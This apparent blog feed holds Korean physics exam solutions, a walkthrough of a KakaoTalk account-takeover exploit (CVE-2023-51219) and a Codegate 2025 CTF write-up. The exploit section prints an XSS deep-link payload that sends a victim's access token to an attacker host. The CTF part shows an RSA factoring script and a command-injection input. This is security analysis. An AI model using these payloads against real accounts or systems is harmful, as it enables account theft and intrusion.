&lt;li&gt;ㄱ &lt;code&gt;X&lt;/code&gt; - $v_b &amp;gt; v_a$ 이고 $t$는 일정하므로 $\bar{v}$은 $B$가 더 크다.&lt;/li&gt;
&lt;li&gt;ㄴ &lt;code&gt;X&lt;/code&gt; - 가속도 $a$는 $\frac{\Delta v}{t}$ 이므로 $B$가 $A$보다 크다.&lt;/li&gt;
&lt;li&gt;ㄷ &lt;code&gt;O&lt;/code&gt; - 역학적 에너지 감소량은 아래와 같이 계산할 수 있다.&lt;br /&gt;
$-mgh$는 $A$, $B$가 모두 같다.&lt;br /&gt;
$E_k$를 계산하면
&lt;ul&gt;
&lt;li&gt;$E_ka = \frac{1}{2}m(v_a)^2$&lt;/li&gt;
&lt;li&gt;$E_kb = \frac{1}{2}m(v_b)^2$&lt;/li&gt;
&lt;li&gt;$v_b &amp;gt; v_a$ 이므로 $E_kb &amp;gt; E_ka$ 따라서 A가 역학적 에너지를 더 많이 잃었다&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;2019 학년도 9월 모평 14번&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./2019_14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;가속도가 $10m/s^2$ 으로 같다 $A, B$의 $a$, $s$, $v_i$가 주어지므로 $t$와 $v_f$를 구해낼 수 있다.&lt;/p&gt;
&lt;p&gt;ㄱ &lt;code&gt;O&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A의 초기 속력은 $20m/s$, B의 초기 속력은 $10m/s$이다.&lt;br /&gt;
이 둘은 중력가속도 $10m/s^2$을 받아 $2$초 후에 충돌한다.&lt;br /&gt;
즉 A의 나중 속력은 $40m/s$, B의 나중 속력은 $30m/s$이다.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ㄴ &lt;code&gt;O&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;운동량은 $P=mv$로 구할 수 있다&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$P_{A,i} = 20 \cdot 1 = 20$, $P_{A,f} = 40 \cdot 1 = 40$&lt;/li&gt;
&lt;li&gt;$P_{B,i} = 10 \cdot 1 = 10$, $P_{B,f} = 30 \cdot 1 = 30$&lt;/li&gt;
&lt;li&gt;$\Delta P$는 $20kg \cdot m/s$로 같다.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;ㄷ &lt;code&gt;O&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$v_{A,i} = 20m/s$, $v_{A, f} = 40m/s$ 이므로 $\bar{v_A}$는 $30m/s$가 된다.&lt;br /&gt;
$\bar{v_A} \cdot t = 30 \cdot 2 = 60 = s$&lt;br /&gt;
$m \cdot g \cdot s = 1 \cdot 10 \cdot 60 = 600$&lt;br /&gt;
충돌할 때 까지 2초가 걸렸으므로 A가 2초 동안 이동한 거리에 mg를 곱하면 $E_k$의 감소량을 구할 수 있다.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;답: 5&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;오투 대수능 대비 특별자료 실전 예상 모의고사 3회 5번&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./o2_3_5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;인텐은 역학적 에너지로 푸는거 같은데 그냥 &lt;code&gt;v-t&lt;/code&gt; 그려서 풀었다&lt;/p&gt;
&lt;p&gt;A의 속력을 $v_A$, 시간을 $t_1$&lt;br /&gt;
B의 속력을 $v_B$, 시간을 $t_2$ 라고 정의할 때 거리가지고 계산해보면 각각 도달한 시간을 구할 수 있다.
$A$는 $\frac{5}{2} t_1$, $B$는 $3t_2$ 걸려서 도착한다.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;문제에서 $4L$까지 운동하는데 걸린 시간이 같다고 명시되어 있으므로&lt;br /&gt;
$\frac{5}{2} t_1 = 3t_2$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;같은거리 $L$을 이동할 때를 가지고 식을 세우면&lt;br /&gt;
$v_A \cdot t_1 = v_B \cdot t_2$&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;두 물체의 질량이 같고 이동한 거리가 같으므로&lt;br /&gt;
$\frac{W_A}{W_B} = \frac{F_A}{F_B} = \frac{a_A}{a_B}$&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;세 식을 모두 정리하면 $\frac{25}{36}$이 나온다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;2022 학년도 9월 모평 20번&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./2022_9_20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;간단하게 마찰구간 빼고 역학적 에너지 보존으로 풀어주면 된다.&lt;/p&gt;
&lt;p&gt;$E_{A,i} + E_{B,i} - E_{\text{손실}} = E_{A,f} + E_{B,f}$&lt;br /&gt;
$3m \cdot g \cdot h_A + 2m \cdot g \cdot h_B - \frac{3}{4}h\cdot 3m \cdot g = \frac{h}{4} \cdot 3m \cdot g + 4h \cdot 2m \cdot g$&lt;/p&gt;
&lt;p&gt;정리하면 아래와 같은 식을 구해낼 수 있다&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$3h_A + 2h_B = 11h$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;문제에서 B의 속력은 충돌 후가 충돌 전의 2배라고 한다
이를 이용해 식을 더 도출해낼 수 있다&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$4h \cdot 2m \cdot g = \frac{1}{2} \cdot 2m \cdot (2v_B)^2$&lt;/li&gt;
&lt;li&gt;$2m \cdot g \cdot h_B = \frac{1}{2} \cdot 2m \cdot (v_B) ^2$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;정리하면&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$v_B^2 = 2gh$&lt;/li&gt;
&lt;li&gt;$v_B^2 = 2gh_B$&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;$h=h_B$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;따라서 $h_A = 3h_B$가 되어 답은 $\frac{1}{3}$이다.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;2021 학년도 10월 학평 20번&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./2021_10_20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;그림이랑 물체 동작 이해하는게 좀 어려웠다.&lt;/p&gt;
&lt;p&gt;기준면을 (가)의 물체 윗부분으로 보고 시작한다&lt;/p&gt;
&lt;p&gt;$E_pA = 6mgd, E_pB = 6mgd$ 이다.&lt;br /&gt;
$E_{\text{탄성}} = 3E_pA = 18mgd (=\frac{1}{2} \cdot k \cdot (6d)^2)$&lt;/p&gt;
&lt;p&gt;역학적 에너지 $E$는 $30mgd$이고 $A$와 $B$의 질량이 같으므로 각각 $15mgd$씩 나눠 가진다&lt;br /&gt;
$E_A = 15mgd, E_B = 15mgd$&lt;/p&gt;
&lt;p&gt;또, $\frac{1}{2}k \cdot (6d)^2 = 18mgd$&lt;br /&gt;
$kd=mg$임을 도출해낸다.&lt;br /&gt;
$E_A = A의 E_{\text{탄성p}} + E_{\text{중력p}} + E_k$이다.&lt;/p&gt;
&lt;p&gt;(나) 그림을 봤을 때 A는 기준면 보다 d만큼 더 내려가 있으므로
$E_{\text{중력p}} = -mgd$&lt;/p&gt;
&lt;p&gt;$15mgd = \frac{1}{2}mgd - mgd + E_k$&lt;/p&gt;
&lt;p&gt;따라서 $E_k = \frac{31}{2}mgd$&lt;/p&gt;
&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;2024 학년도 수능 20번&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./2024_scat_20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;세 과정이 필요하다&lt;/p&gt;
&lt;h4&gt;1. 충격량 이용&lt;/h4&gt;
&lt;p&gt;충돌 전 A의 속력을 $v$, 충돌 후 $A, B$의 속력을 각각 $v_A, v_B$라고 하자&lt;/p&gt;
&lt;p&gt;$mv = -mv_A + 2mv_B$ 라는 식이 나온다.&lt;br /&gt;
정리하면 $v=-v_A + 2v_B$&lt;/p&gt;
&lt;h4&gt;2. 운동에너지 보존&lt;/h4&gt;
&lt;p&gt;$\frac{1}{2}mv^2 = \frac{1}{2}mv_A^2 + \frac{1}{2} \cdot 2mv_B^2$&lt;br /&gt;
$v^2 = v_A^2 + 2v_B^2$&lt;/p&gt;
&lt;p&gt;첫번째 식을 두 번째 식에 대입하면&lt;br /&gt;
$v_B(v_B - 2v_A) = 0$&lt;br /&gt;
$v_B \ne 0$이므로 $v_B = 2v_A$&lt;/p&gt;
&lt;p&gt;$v$에 대해 표현하면
$v_A = \frac{1}{3}v, v_B = \frac{2}{3}v$&lt;/p&gt;
&lt;h4&gt;3. 역학적 에너지 보존&lt;/h4&gt;
&lt;p&gt;w는 마찰구간에서 손실 되는 에너지&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$9mgh - w = \frac{1}{2}mv^2$&lt;/li&gt;
&lt;li&gt;$2mg \cdot \frac{7}{2}h = \frac{1}{2} \cdot 2m \cdot \frac{4}{9}v^2 - w$&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;$$
\begin{cases}
9mgh - w = \frac{1}{2}mv^2 \
2mg \cdot \frac{7}{2}h  + w= \frac{1}{2} \cdot 2m \cdot \frac{4}{9}v^2
\end{cases}
$$&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;$w=\frac{9}{17}mgh$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;$\frac{1}{2}mv_A^2 - w = mgH$&lt;br /&gt;
$= \frac{1}{2}m \cdot \frac{v^2}{9} - \frac{9}{17}mgh = mgH$&lt;/p&gt;
&lt;p&gt;연립방정식의 첫번째 식에서   $9mgh - w = \frac{1}{2}mv^2$가 등장하므로&lt;br /&gt;
구한 w를 사용해 변형하면
$\frac{1}{2}mv^2 = 16mgh \cdot \frac{9}{17}$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;$\frac{1}{2}m \cdot \frac{v^2}{9} - \frac{9}{17}mgh = mgH$&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;$(16mgh \cdot \frac{9}{17}m) \cdot \frac{1}{9} - \frac{9}{17}mgh = mgH$&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ol&gt;
&lt;li&gt;$H = \frac{7}{17}h$&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;답: 2&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;??? 학년도 ?? 20번&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;문제는 나중에 첨부하겠다&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;A 초기 속력: 4v, 나중 속력: v,&lt;br /&gt;
B 초기 속력: $v_B$, 나중 속력: $v_B&apos;$
이라고 정의한다.&lt;/p&gt;
&lt;h4&gt;1. A, B가 올라갈 때 까지&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;A가 올라갈 때:&lt;/p&gt;
&lt;p&gt;$\frac{1}{2} \cdot k \cdot d^2 = 2m \cdot g \cdot h + \frac{1}{2} \cdot 2m \cdot (4v) ^ 2$
-&amp;gt; $kd^2 = 4mgh + 32mv^2$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;B가 올라갈 때
$\frac{1}{2} \cdot 2k \cdot d^2 - mgh (\text{마찰}) = mg \cdot 3h + \frac{1}{2}mv_B^2$
-&amp;gt; $kd^2 = 4mgh + \frac{1}{2}mv_B^2$&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;두 식에 의하여 $32mv^2 = \frac{1}{2}mv_B^2$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$v_B = 8v$&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;2. 충격량 적용&lt;/h4&gt;
&lt;p&gt;$2m \cdot 4v + -(8v) \cdot m = -(2m) \cdot v + m \cdot v_B&apos;$&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;$v_B&apos; = 2v$&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;3. A, B가 돌아갈 때&lt;/h4&gt;
&lt;p&gt;$A, B$의 나중 속력을 알기에 식 두 개를 도출해 낼 수 있다.&lt;/p&gt;
&lt;h4&gt;3-1. A가 돌아갈 때 $\frac{d}{2}$ 압축&lt;/h4&gt;
&lt;p&gt;$2m \cdot g \cdot h + \frac{1}{2} \cdot 2m \cdot v^2 = \frac{1}{2} \cdot k \cdot (\frac{d}{2})^2$&lt;br /&gt;
정리: $\frac{kd^2}{8} = 2mgh + mv^2$&lt;/p&gt;
&lt;h4&gt;3-2. B가 돌아갈 때 $x$ 압축&lt;/h4&gt;
&lt;p&gt;$m \cdot g \cdot 3h + \frac{1}{2} \cdot m \cdot (2v)^2 = \frac{1}{2} \cdot 2k \cdot x^2 + mgh (\text{마찰})$&lt;br /&gt;
정리: $kx^2 = 2mgh + 2mv^2$&lt;/p&gt;
&lt;h4&gt;4. 마무리&lt;/h4&gt;
&lt;p&gt;우리가 구해야하는건 $\frac{x}{d}$이지만, 두 식으로는 이 꼴을 만들 수 없어보인다.&lt;/p&gt;
&lt;p&gt;그러나 &lt;code&gt;1&lt;/code&gt;과정에서 구한 $kd^2 = 4mgh + 32mv^2$식을 이용해 $gh$와 $v$에 대한 관계식을 만들어 연립할 수 있다&lt;/p&gt;
&lt;p&gt;$[\frac{kd^2}{8} = 2mgh + mv^2] = [kd^2 = 16mgh + 8mv^2]$&lt;/p&gt;
&lt;p&gt;$$
\begin{cases}
kd^2 = 16mgh + 8mv^2 \
kd^2 = 4mgh + 32mv^2
\end{cases}
$$&lt;/p&gt;
&lt;p&gt;$12mgh = 24mv^2$&lt;br /&gt;
$gh = 2v^2$&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;$kx^2 = 3mgh$&lt;/li&gt;
&lt;li&gt;$kd^2 = 16mgh + 8mv^2 = 20mgh$&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;$\frac{x^2}{d^2} = \frac{3}{20}$&lt;br /&gt;
$\frac{x}{d} = \sqrt{\frac{3}{20}}$&lt;/p&gt;
&lt;p&gt;&lt;code&gt;답: 5&lt;/code&gt;&lt;/p&gt;
&lt;hr /&gt;
</content:encoded></item><item><title>CVE-2023-51219 Kakaotalk One Click Exploit</title><link>https://itznullbyte.github.io/posts/cve-2020-0601/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cve-2020-0601/</guid><description> </description><pubDate>Mon, 02 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note
https://stulle123.github.io/posts/kakaotalk-account-takeover/&lt;br /&gt;
stulle123님의 블로그를 기반으로 합니다.
:::&lt;/p&gt;
&lt;p&gt;카카오 버그바운티에 자주 참여하는 사람으로써 해당 취약점 분석을 안해볼 수 없었습니다.
&lt;code&gt;stulle123&lt;/code&gt;님의 블로그와 관련 자료를 기반으로 하여, 구버전 카톡을 분석하였습니다&lt;/p&gt;
&lt;p&gt;공격자는 해당 취약점을 이용해 원클릭으로 상대의 카카오톡 세션을 탈취할 수 있었습니다.&lt;/p&gt;
&lt;p&gt;공격루틴은 아래와 같습니다&lt;/p&gt;
&lt;h3&gt;1. XSS를 통한 access token 탈취&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:&quot;&amp;gt;&amp;lt;img src=x onerror=&quot;document.location=atob(&apos;aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUv&apos;);&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;카카오톡 Android 앱의 &lt;code&gt;CommerceBuyActivity&lt;/code&gt;는 딥링크를 통해 외부 웹페이지를 WebView로 로드합니다.
공격자는 이를 이용해 위와 같은 XSS 페이로드를 작성했습니다.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;CommerceBuyActivity&lt;/code&gt;에서 &lt;code&gt;kakaotalk://buy/hello&lt;/code&gt;는 &lt;code&gt;https://buy.kakao.com/hello&lt;/code&gt;와 같이 해석되어 URL을 로드합니다.&lt;/p&gt;
&lt;p&gt;이 상태에서는 buy.kakao.com에서 xss를 터트리는 것 외에는 방법이 없어보입니다.
따라서 분석자는 &lt;code&gt;https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=&lt;/code&gt;에서 Open Redirect 취약점을 찾아 다른 xss 포인트로 옮기는 방법을 사용했습니다.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;shoppinghow.kakao.com&lt;/code&gt;에서 DOM기반 XSS 취약점이 터져 해당 포인트에서 익스플로잇 했습니다.&lt;/p&gt;
&lt;h3&gt;2. 카카오 메일 계정 탈취&lt;/h3&gt;
&lt;p&gt;서버로 요청된 &lt;code&gt;Authorization&lt;/code&gt; 헤더에서 카카오 계정 access token이 노출됩니다&lt;/p&gt;
&lt;p&gt;카카오 계정 토큰을 가지고 카카오 메일의 토큰을 만들었고 카카오 메일 계정을 탈취했습니다&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;비밀번호 재설정을 요청합니다&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/kakao_accounts/check_verify_type_for_find_password.json&lt;/code&gt; 패킷을 위조해 재설정 인증번호를 카카오 메일로 받습니다&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code&gt;{
  &quot;status&quot;: 0,
  &quot;verify_types&quot;: [
    0
  ],
  &quot;suspended&quot;: false,
  &quot;dormant&quot;: false,
  &quot;kakaotalk&quot;: false,
  &quot;expired&quot;: false,
  &quot;created_at&quot;: 1700754321,
  &quot;two_step_verification&quot;: false,
  &quot;is_fill_in_email&quot;: false,
  &quot;account_type&quot;: 0,
  &quot;display_id&quot;: null
}
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;verify_types&lt;/code&gt;을 변경해 확인코드가 폰 대신 이메일로 전송되게 만들었다고 합니다&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;이를 통해 탈취한 이메일로 인증번호를 받아 비밀번호를 변경했습니다&lt;/p&gt;
&lt;h3&gt;3. 카카오톡 계정 탈취&lt;/h3&gt;
&lt;p&gt;카카오톡 로그인에는 4자리 핀코드를 입력하는 2차 인증이 기본적으로 설정 되어 있습니다.&lt;/p&gt;
&lt;p&gt;https://talk-pilsner.kakao.com/talk-public/account/passcodeLogin/authorize
https://katalk.kakao.com/win32/account/register_device.json&lt;/p&gt;
&lt;p&gt;각각 모바일, PC에서의 인증번호를 받는 HTTP API 입니다.&lt;/p&gt;
&lt;p&gt;탈취한 access_token을 사용해 PIN 번호를 임의로 가져올 수 있었습니다.&lt;/p&gt;
&lt;p&gt;이로써 공격자는 완전히 피해자의 카카오톡 계정을 탈취했습니다.&lt;/p&gt;
</content:encoded></item><item><title>Codegate 2025 Quals Write-Up</title><link>https://itznullbyte.github.io/posts/codegate/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/codegate/</guid><description>Hard..</description><pubDate>Thu, 03 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Solve&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Hello Codegate (misc)&lt;/li&gt;
&lt;li&gt;Captcha World (misc)&lt;/li&gt;
&lt;li&gt;Encrypted flag (crypto)&lt;/li&gt;
&lt;li&gt;initial (rev)&lt;/li&gt;
&lt;li&gt;Ping Tester (web)&lt;/li&gt;
&lt;li&gt;Token Rush (web)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Comment&lt;/h2&gt;
&lt;p&gt;처음으로 코드게이트에 참여했다.&lt;br /&gt;
5개월 전부터 코드게이트 본선 진출을 목표로 드림핵 워게임 풀이를 시작했는데 결국 고수들한테 밀려버렸다.&lt;br /&gt;
체감상 지금까지 코드게이트 문제들중에 웹이 제일 어려웠던거 같다&lt;br /&gt;
끝나기 4시간 전까지 스코어보드에 내 닉네임이 나오고 있었기에 기대감을 품고 있긴 했는데, 역시.. 후반에 쭉 밀려서 31등까지 떨어졌다.&lt;/p&gt;
&lt;p&gt;하지만 풀이자가 얼마없던 Token rush를 풀었고, Masquerade도 어느 정도 접근했었기 때문에 확실히 성장한 게 느껴져서 좋았다.&lt;/p&gt;
&lt;p&gt;몇 달 뒤 있는 CCE는 본선 가고싶다&lt;/p&gt;
&lt;h2&gt;Write-Up&lt;/h2&gt;
&lt;h3&gt;Hello Codegate&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./hello_codegate.png&quot; alt=&quot;&quot; /&gt;
&lt;code&gt;codegate2025{65782695e16255e3ef8517a1bfb059f0}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Captcha World&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./captha_world.png&quot; alt=&quot;&quot; /&gt;
1분 안에 캡챠 10개 풀면 플래그 준다.
알파벳 O랑 숫자 0 구별하는게 어려워서 좀 애먹었다.
&lt;code&gt;codegate2025{052ddb9aed355bb13db11f6178c9fad4856003a7aa1e3c4c119317093f6da52895f98ba40b30034583e5859ddc568e}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Encrypted flag&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;from Crypto.Util.number import bytes_to_long, getPrime
from sympy import nextprime
import gmpy2

p = getPrime(512)
q = nextprime(p)

n = p * q
e = 65537

flag = &quot;codegate2025{FAKE_FLAG}&quot;
phi = (p - 1) * (q - 1)

d = gmpy2.invert(e, phi)

m = bytes_to_long(flag.encode())
c = pow(m, e, n)

print(f&quot;n: {n}&quot;)
print(f&quot;e: {e}&quot;)
print(&quot;Encrypted flag:&quot;, c)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;RSA 암호화를 사용해 플래그를 암호화하고, n, e, encrypted flag를 주고 있다.&lt;br /&gt;
nextprime() 함수를 사용해 p와 가까운 q를 생성하는 방식이기에 취약하지 않을까? 라는 의심이 들었고&lt;br /&gt;
이를 바탕으로 gpt한테 복호화 코드를 짜달라 해서 돌렸다. p와 q를 찾고 플래그를 얻어낼 수 있었다.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from Crypto.Util.number import long_to_bytes
import gmpy2

n = 54756668623799501273661800933882720939597900879404357288428999230135977601404008182853528728891571108755011292680747299434740465591780820742049958146587060456010412555357258580332452401727868163734930952912198058084689974208638547280827744839358100210581026805806202017050750775163530268755846782825700533559
e = 65537
c = 7728462678531582833823897705285786444161591728459008932472145620845644046450565339835113761143563943610957661838221298240392904711373063097593852621109599751303613112679036572669474191827826084312984251873831287143585154570193022386338846894677372327190250188401045072251858178782348567776180411588467032159

p = gmpy2.isqrt(n)
print(p)
while n % p != 0:
    p = gmpy2.next_prime(p)
q = n // p
print(q)

phi = (p - 1) * (q - 1)
d = pow(e, -1, phi)
m = pow(c, d, n)

print(long_to_bytes(m).decode())
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;codegate2025{Cl0se_p_q_0f_RSA_Is_Vu1n3rabIe}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Initial&lt;/h3&gt;
&lt;p&gt;문제 바이너리를 못 찾아 자세한 풀이는 쓰지 못했다&lt;/p&gt;
&lt;p&gt;기억하기로는 두 개의 배열이 주어지는데&lt;/p&gt;
&lt;p&gt;두 번째 배열을 기반으로 수도코드에 나와있던 대로 역회전 후 새로운 배열을 만들어 XOR 했던 거 같다&lt;/p&gt;
&lt;p&gt;&lt;code&gt;codegate2025{Hell0_W0r1d_R3V_^^}&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;Ping Tester&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;@app.route(&apos;/ping&apos;, methods=[&apos;GET&apos;])
def ping():
    ip = request.args.get(&apos;ip&apos;)
    if ip:
        result = subprocess.run(f&quot;ping -c 3 {ip}&quot;, shell=True, capture_output=True, text=True)
        return render_template(&apos;ping.html&apos;, result=result.stdout)
    else:
        return render_template(&apos;ping.html&apos;, message=&quot;Please provide IP address.&quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;간단한 커맨드 인젝션 문제이다
&lt;code&gt;1.1.1.1 &amp;amp;&amp;amp; cat flag&lt;/code&gt;으로 플래그 읽어와주면 된다.&lt;/p&gt;
&lt;p&gt;문제서버가 닫혀서 플래그는 적지 못했다.&lt;/p&gt;
&lt;h3&gt;Token Rush&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;const express = require(&quot;express&quot;);
const cookieParser = require(&quot;cookie-parser&quot;);
const crypto = require(&apos;node:crypto&apos;);
const fs = require(&quot;fs&quot;);
const path = require(&quot;path&quot;);
const b64Lib = require(&quot;base64-arraybuffer&quot;);
const flag = &quot;codegate2025{FAKE_FLAG}&quot;;
const PrivateKey = `FAKE_PRIVATE_KEY`;
const PublicKey = `63c9b8f6cc06d91f1786aa3399120957f2f4565892a6763a266d54146e6d4af9`;
const tokenDir = path.join(__dirname, &quot;token&quot;);
const app = express();
app.use(express.json());
app.use(cookieParser());
app.set(&quot;view engine&quot;, &quot;ejs&quot;);
Object.freeze(Object.prototype);
fs.promises.mkdir(tokenDir, { recursive: true });

let db = {
    admin: { uid: &quot;87c869e7295663f2c0251fc31150d0e3&quot;,
            pw: crypto.randomBytes(32).toString(&apos;hex&apos;),
            name: &quot;administrator&quot;
        }
};

let temporaryFileName = path.join(tokenDir, crypto.randomBytes(32).toString(&apos;hex&apos;));

const gen_hash = async () =&amp;gt; {
    let data = &quot;&quot;;
    for (var i = 0; i &amp;lt; 1234; i++) {
        data += crypto.randomBytes(1234).toString(&apos;hex&apos;)[0];
    }
    const hash = crypto.createHash(&apos;sha256&apos;).update(data);
    return hash.digest(&apos;hex&apos;).slice(0, 32);
};

const gen_JWT = async (alg, userId, key) =&amp;gt; {
    const strEncoder = new TextEncoder();
    let headerData = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ alg: alg, typ: &quot;JWT&quot; }))));
    let payload = urlsafe(b64Lib.encode(strEncoder.encode(JSON.stringify({ uid: userId }))));
    if (alg == &quot;ES256&quot;) {
        let baseKey = await crypto.subtle.importKey(&quot;pkcs8&quot;, b64Lib.decode(key), { name: &quot;ECDSA&quot;, namedCurve: &quot;P-256&quot; }, true, [&quot;sign&quot;]);
        let sig = await crypto.subtle.sign({ name: &quot;ECDSA&quot;, hash: &quot;SHA-256&quot; }, baseKey, new TextEncoder().encode(`${headerData}.${payload}`));
        return `${headerData}.${payload}.${urlsafe(b64Lib.encode(new Uint8Array(sig)))}`;
    }
};

const read_JWT = async (token) =&amp;gt; {
    const decoder = new TextDecoder();
    let payload = token.split(&quot;.&quot;)[1];
    return JSON.parse(decoder.decode(b64Lib.decode(decodeurlsafe(payload))).replaceAll(&apos;\x00&apos;, &apos;&apos;));
};

const urlsafe = (base) =&amp;gt; base.replace(/\+/g, &quot;-&quot;).replace(/\//g, &quot;_&quot;).replace(/=+$/, &quot;&quot;);
const decodeurlsafe = (dat) =&amp;gt; dat.replace(/-/g, &quot;+&quot;).replace(/_/g, &quot;/&quot;);

app.post(&apos;/&apos;, () =&amp;gt; {});

app.post(&quot;/sign_in&quot;, async (req, res) =&amp;gt; {
    try {
        const { id, pw } = req.body;
        if (!db[id] || db[id][&quot;pw&quot;] !== pw) {
            res.json({ message: &quot;Invalid credentials&quot; });
            return;
        }
        let token = await gen_JWT(&quot;ES256&quot;, db[id][&quot;uid&quot;], PrivateKey);
        res.cookie(&quot;check&quot;, token, { maxAge: 100 }).json({ message: &quot;Success&quot; });
    } catch (a) {
        res.json({ message: &quot;Failed&quot; });
    }
});

app.post(&quot;/sign_up&quot;, async (req, res) =&amp;gt; {
    try {
        const { id, data } = req.body;
        if (id.toLowerCase() === &quot;administrator&quot; || db[id]) {
            res.json({ message: &quot;Unallowed key&quot; });
            return;
        }
        db[id] = { ...data, uid: crypto.randomBytes(32).toString(&apos;hex&apos;) };
        res.json({ message: &quot;Success&quot; });
    } catch (a) {
        res.json({ message: &quot;Failed&quot; });
    }
});

app.post(&quot;/2fa&quot;, async (req, res) =&amp;gt; {
    try {
        const token = req.cookies.check ?? &quot;&quot;;
        const data = await read_JWT(token, PublicKey);
        if (db.admin.uid !== data.uid) {
            res.json({ message: &quot;Permission denied&quot; });
            return;
        }
        let rand_data = await gen_hash();
        await fs.promises.writeFile(temporaryFileName, rand_data);
        res.json({ message: &quot;Success&quot; });
    } catch (a) {
        res.json({ message: &quot;Unauthorized&quot; });
    }
});

